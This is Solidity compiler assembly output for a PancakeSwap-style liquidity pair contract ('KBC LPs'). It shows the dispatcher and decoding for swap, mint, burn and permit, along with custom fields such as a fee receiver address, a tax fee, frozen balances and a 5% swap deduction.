   jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x70a08231\n      gt\n      tag_34\n      jumpi\n      dup1\n      0xbc25cf77\n      gt\n      tag_35\n      jumpi\n      dup1\n      0xdcbbb373\n      gt\n      tag_36\n      jumpi\n      dup1\n      0xdcbbb373\n      eq\n      tag_30\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_31\n      jumpi\n      dup1\n      0xf317739c\n      eq\n      tag_32\n      jumpi\n      dup1\n      0xfff6cae9\n      eq\n      tag_33\n      jumpi\n      jump(tag_2)\n    tag_36:\n      dup1\n      0xbc25cf77\n      eq\n      tag_26\n      jumpi\n      dup1\n      0xc45a0155\n      eq\n      tag_27\n      jumpi\n      dup1\n      0xd21220a7\n      eq\n      tag_28\n      jumpi\n      dup1\n      0xd505accf\n      eq\n      tag_29\n      jumpi\n      jump(tag_2)\n    tag_35:\n      dup1\n      0x900820d8\n      gt\n      tag_37\n      jumpi\n      dup1\n      0x900820d8\n      eq\n      tag_22\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_23\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_24\n      jumpi\n      dup1\n      0xba9a7a56\n      eq\n      tag_25\n      jumpi\n      jump(tag_2)\n    tag_37:\n      dup1\n      0x70a08231\n      eq\n      tag_18\n      jumpi\n      dup1\n      0x7464fc3d\n      eq\n      tag_19\n      jumpi\n      dup1\n      0x7ecebe00\n      eq\n      tag_20\n      jumpi\n      dup1\n      0x89afcb44\n      eq\n      tag_21\n      jumpi\n      jump(tag_2)\n    tag_34:\n      dup1\n      0x23b872dd\n      gt\n      tag_38\n      jumpi\n      dup1\n      0x47d5d856\n      gt\n      tag_39\n      jumpi\n      dup1\n      0x47d5d856\n      eq\n      tag_14\n      jumpi\n      dup1\n      0x5909c0d5\n      eq\n      tag_15\n      jumpi\n      dup1\n      0x5a3d5493\n      eq\n      tag_16\n      jumpi\n      dup1\n      0x6a627842\n      eq\n      tag_17\n      jumpi\n      jump(tag_2)\n    tag_39:\n      dup1\n      0x23b872dd\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x30adf81f\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_12\n      jumpi\n      dup1\n      0x3644e515\n      eq\n      tag_13\n      jumpi\n      jump(tag_2)\n    tag_38:\n      dup1\n      0x095ea7b3\n      gt\n      tag_40\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x0dfe1681\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x1794bb3c\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_40:\n      dup1\n      0x022c0d9f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x06fdde03\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x0902f1ac\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n    tag_3:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0x80\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_42\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_42:\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n      dup2\n      calldataload\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n      0x40\n      dup4\n      add\n      calldataload\n      and\n      swap2\n      swap1\n      dup2\n      add\n      swap1\n      0x80\n      dup2\n      add\n      0x60\n      dup3\n      add\n      calldataload\n        /* \"--CODEGEN--\":21:32   */\n      0x0100000000\n        /* \"--CODEGEN--\":5:33   */\n      dup2\n      gt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_43\n      jumpi\n        /* \"--CODEGEN--\":46:47   */\n      0x00\n        /* \"--CODEGEN--\":43:44   */\n      dup1\n        /* \"--CODEGEN--\":36:48   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_43:\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n      dup3\n      add\n        /* \"--CODEGEN--\":35:44   */\n      dup4\n        /* \"--CODEGEN--\":28:32   */\n      0x20\n        /* \"--CODEGEN--\":12:26   */\n      dup3\n        /* \"--CODEGEN--\":8:33   */\n      add\n        /* \"--CODEGEN--\":5:45   */\n      gt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":58:59   */\n      0x00\n        /* \"--CODEGEN--\":55:56   */\n      dup1\n        /* \"--CODEGEN--\":48:60   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_44:\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap2\n        /* \"--CODEGEN--\":100:109   */\n      dup5\n        /* \"--CODEGEN--\":95:96   */\n      0x01\n        /* \"--CODEGEN--\":81:93   */\n      dup4\n        /* \"--CODEGEN--\":77:97   */\n      mul\n        /* \"--CODEGEN--\":67:75   */\n      dup5\n        /* \"--CODEGEN--\":63:98   */\n      add\n        /* \"--CODEGEN--\":60:110   */\n      gt\n        /* \"--CODEGEN--\":39:50   */\n      0x0100000000\n        /* \"--CODEGEN--\":25:37   */\n      dup4\n        /* \"--CODEGEN--\":22:51   */\n      gt\n        /* \"--CODEGEN--\":11:118   */\n      or\n        /* \"--CODEGEN--\":8:10   */\n      iszero\n      tag_45\n      jumpi\n        /* \"--CODEGEN--\":131:132   */\n      0x00\n        /* \"--CODEGEN--\":128:129   */\n      dup1\n        /* \"--CODEGEN--\":121:133   */\n      revert\n        /* \"--CODEGEN--\":8:10   */\n    tag_45:\n      pop\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n      swap1\n      swap3\n      pop\n      swap1\n      pop\n      tag_46\n      jump\t// in\n    tag_41:\n      stop\n        /* \"src/ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_4:\n      tag_47\n      tag_48\n      jump\t// in\n    tag_47:\n      0x40\n      dup1\n      mload\n      0x20\n      dup1\n      dup3\n      mstore\n      dup4\n      mload\n      dup2\n      dup4\n      add\n      mstore\n      dup4\n      mload\n      swap2\n      swap3\n      dup4\n      swap3\n      swap1\n      dup4\n      add\n      swap2\n      dup6\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_49:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_51\n      jumpi\n        /* \"--CODEGEN--\":90:101   */\n      dup2\n      dup2\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":71:82   */\n      dup4\n      dup3\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_49)\n    tag_51:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"src/ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_52\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_52:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"src/Pair.sol\":1280:1581  function getReserves()... */\n    tag_5:\n      tag_53\n      tag_54\n      jump\t// in\n    tag_53:\n      0x40\n      dup1\n      mload\n      sub(shl(0x70, 0x01), 0x01)\n      swap5\n      dup6\n      and\n      dup2\n      mstore\n      swap3\n      swap1\n      swap4\n      and\n      0x20\n      dup4\n      add\n      mstore\n      0xffffffff\n      and\n      dup2\n      dup4\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x60\n      add\n      swap1\n      return\n        /* \"src/ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_6:\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_56\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_56:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_57\n      jump\t// in\n    tag_55:\n      0x40\n      dup1\n      mload\n      swap2\n      iszero\n      iszero\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/Pair.sol\":587:608  address public token0 */\n    tag_7:\n      tag_58\n      tag_59\n      jump\t// in\n    tag_58:\n      0x40\n      dup1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/Pair.sol\":2478:2752  function initialize(... */\n    tag_8:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_61\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_61:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":2478:2752  function initialize(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_62\n      jump\t// in\n        /* \"src/ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_9:\n      tag_63\n      tag_64\n      jump\t// in\n    tag_63:\n      0x40\n      dup1\n      mload\n      swap2\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_10:\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_66\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_66:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3108:3469  function transferFrom(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_67\n      jump\t// in\n        /* \"src/ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_11:\n      tag_63\n      tag_69\n      jump\t// in\n        /* \"src/ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_12:\n      tag_70\n      tag_71\n      jump\t// in\n    tag_70:\n      0x40\n      dup1\n      mload\n      0xff\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_13:\n      tag_63\n      tag_73\n      jump\t// in\n        /* \"src/ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_14:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_75\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_75:\n      pop\n        /* \"src/ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_76\n      jump\t// in\n        /* \"src/Pair.sol\":934:966  uint public price0CumulativeLast */\n    tag_15:\n      tag_63\n      tag_78\n      jump\t// in\n        /* \"src/Pair.sol\":972:1004  uint public price1CumulativeLast */\n    tag_16:\n      tag_63\n      tag_80\n      jump\t// in\n        /* \"src/Pair.sol\":4905:6170  function mint(address to) external lock returns (uint liquidity) {... */\n    tag_17:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_82\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_82:\n      pop\n        /* \"src/Pair.sol\":4905:6170  function mint(address to) external lock returns (uint liquidity) {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_83\n      jump\t// in\n        /* \"src/ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_18:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_85\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_85:\n      pop\n        /* \"src/ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_86\n      jump\t// in\n        /* \"src/Pair.sol\":1010:1027  uint public kLast */\n    tag_19:\n      tag_63\n      tag_88\n      jump\t// in\n        /* \"src/ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_20:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_90\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_90:\n      pop\n        /* \"src/ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_91\n      jump\t// in\n        /* \"src/Pair.sol\":7669:9098  function burn(... */\n    tag_21:\n      tag_92\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_93\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_93:\n      pop\n        /* \"src/Pair.sol\":7669:9098  function burn(... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_94\n      jump\t// in\n    tag_92:\n      0x40\n      dup1\n      mload\n      swap3\n      dup4\n      mstore\n      0x20\n      dup4\n      add\n      swap2\n      swap1\n      swap2\n      mstore\n      dup1\n      mload\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      return\n        /* \"src/Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n    tag_22:\n      tag_58\n      tag_96\n      jump\t// in\n        /* \"src/ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_23:\n      tag_47\n      tag_98\n      jump\t// in\n        /* \"src/ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_24:\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_104\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_104:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_105\n      jump\t// in\n        /* \"src/Pair.sol\":402:450  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n    tag_25:\n      tag_63\n      tag_107\n      jump\t// in\n        /* \"src/Pair.sol\":17701:18122  function skim(address to) external lock {... */\n    tag_26:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_109\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_109:\n      pop\n        /* \"src/Pair.sol\":17701:18122  function skim(address to) external lock {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_110\n      jump\t// in\n        /* \"src/Pair.sol\":559:581  address public factory */\n    tag_27:\n      tag_58\n      tag_112\n      jump\t// in\n        /* \"src/Pair.sol\":614:635  address public token1 */\n    tag_28:\n      tag_58\n      tag_114\n      jump\t// in\n        /* \"src/ERC20.sol\":3475:4439  function permit(... */\n    tag_29:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0xe0\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_116\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_116:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3475:4439  function permit(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      dup2\n      add\n      calldataload\n      swap1\n      0x60\n      dup2\n      add\n      calldataload\n      swap1\n      0xff\n      0x80\n      dup3\n      add\n      calldataload\n      and\n      swap1\n      0xa0\n      dup2\n      add\n      calldataload\n      swap1\n      0xc0\n      add\n      calldataload\n      tag_117\n      jump\t// in\n        /* \"src/Pair.sol\":6279:7560  function Lockmint(address to) external lock returns (uint liquidity) {... */\n    tag_30:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_119\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_119:\n      pop\n        /* \"src/Pair.sol\":6279:7560  function Lockmint(address to) external lock returns (uint liquidity) {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_120\n      jump\t// in\n        /* \"src/ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_31:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_122\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_122:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      add\n      calldataload\n      and\n      tag_123\n      jump\t// in\n        /* \"src/Pair.sol\":641:659  uint public taxfee */\n    tag_32:\n      tag_63\n      tag_125\n      jump\t// in\n        /* \"src/Pair.sol\":18168:18382  function sync() external lock {... */\n    tag_33:\n      tag_41\n      tag_127\n      jump\t// in\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n    tag_46:\n        /* \"src/Pair.sol\":1179:1187  unlocked */\n      sload(0x0f)\n        /* \"src/Pair.sol\":1191:1192  1 */\n      0x01\n        /* \"src/Pair.sol\":1179:1192  unlocked == 1 */\n      eq\n        /* \"src/Pair.sol\":1171:1212  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_129\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_129:\n        /* \"src/Pair.sol\":1233:1234  0 */\n      0x00\n        /* \"src/Pair.sol\":1222:1230  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1222:1234  unlocked = 0 */\n      sstore\n        /* \"src/Pair.sol\":11764:11778  amount0Out > 0 */\n      dup5\n      iszero\n      iszero\n      dup1\n        /* \"src/Pair.sol\":11764:11796  amount0Out > 0 || amount1Out > 0 */\n      tag_131\n      jumpi\n      pop\n        /* \"src/Pair.sol\":11795:11796  0 */\n      0x00\n        /* \"src/Pair.sol\":11782:11792  amount1Out */\n      dup5\n        /* \"src/Pair.sol\":11782:11796  amount1Out > 0 */\n      gt\n        /* \"src/Pair.sol\":11764:11796  amount0Out > 0 || amount1Out > 0 */\n    tag_131:\n        /* \"src/Pair.sol\":11743:11857  require(... */\n      tag_132\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x23\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8\n      0x23\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_132:\n        /* \"src/Pair.sol\":11868:11885  uint112 _reserve0 */\n      0x00\n        /* \"src/Pair.sol\":11887:11904  uint112 _reserve1 */\n      dup1\n        /* \"src/Pair.sol\":11910:11923  getReserves() */\n      tag_133\n        /* \"src/Pair.sol\":11910:11921  getReserves */\n      tag_54\n        /* \"src/Pair.sol\":11910:11923  getReserves() */\n      jump\t// in\n    tag_133:\n        /* \"src/Pair.sol\":11867:11923  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      pop\n      swap2\n      pop\n      swap2\n      pop\n        /* \"src/Pair.sol\":11982:11991  _reserve0 */\n      dup2\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":11969:11991  amount0Out < _reserve0 */\n      and\n        /* \"src/Pair.sol\":11969:11979  amount0Out */\n      dup8\n        /* \"src/Pair.sol\":11969:11991  amount0Out < _reserve0 */\n      lt\n        /* \"src/Pair.sol\":11969:12017  amount0Out < _reserve0 && amount1Out < _reserve1 */\n      dup1\n      iszero\n      tag_134\n      jumpi\n      pop\n        /* \"src/Pair.sol\":12008:12017  _reserve1 */\n      dup1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":11995:12017  amount1Out < _reserve1 */\n      and\n        /* \"src/Pair.sol\":11995:12005  amount1Out */\n      dup7\n        /* \"src/Pair.sol\":11995:12017  amount1Out < _reserve1 */\n      lt\n        /* \"src/Pair.sol\":11969:12017  amount0Out < _reserve0 && amount1Out < _reserve1 */\n    tag_134:\n        /* \"src/Pair.sol\":11948:12074  require(... */\n      tag_135\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1f\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e53554646494349454e545f4c495155494449545900\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_135:\n        /* \"src/Pair.sol\":12085:12098  uint balance0 */\n      0x00\n      dup1\n      dup1\n        /* \"src/Pair.sol\":12198:12201  100 */\n      0x64\n        /* \"src/Pair.sol\":12193:12194  5 */\n      0x05\n        /* \"src/Pair.sol\":12180:12194  amount0Out * 5 */\n      dup12\n      mul\n        /* \"src/Pair.sol\":12179:12201  (amount0Out * 5) / 100 */\n      div\n        /* \"src/Pair.sol\":12166:12201  amount0Out - (amount0Out * 5) / 100 */\n      dup11\n      sub\n      swap1\n      pop\n        /* \"src/Pair.sol\":12215:12233  uint taxamount1Out */\n      0x00\n        /* \"src/Pair.sol\":12268:12271  100 */\n      0x64\n        /* \"src/Pair.sol\":12263:12264  5 */\n      0x05\n        /* \"src/Pair.sol\":12250:12264  amount1Out * 5 */\n      dup12\n      mul\n        /* \"src/Pair.sol\":12371:12377  token0 */\n      sload(0x08)\n        /* \"src/Pair.sol\":12409:12415  token1 */\n      sload(0x09)\n        /* \"src/Pair.sol\":12249:12271  (amount1Out * 5) / 100 */\n      swap3\n      swap1\n      swap2\n      div\n        /* \"src/Pair.sol\":12236:12271  amount1Out - (amount1Out * 5) / 100 */\n      dup13\n      sub\n      swap3\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":12371:12377  token0 */\n      swap1\n      dup2\n      and\n      swap2\n        /* \"src/Pair.sol\":12409:12415  token1 */\n      dup2\n      and\n      swap1\n        /* \"src/Pair.sol\":12437:12450  to != _token0 */\n      dup12\n      and\n      dup3\n      eq\n      dup1\n      iszero\n      swap1\n        /* \"src/Pair.sol\":12437:12467  to != _token0 && to != _token1 */\n      tag_138\n      jumpi\n      pop\n        /* \"src/Pair.sol\":12460:12467  _token1 */\n      dup1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":12454:12467  to != _token1 */\n      and\n        /* \"src/Pair.sol\":12454:12456  to */\n      dup12\n      sub(shl(0xa0, 0x01), 0x01)\n        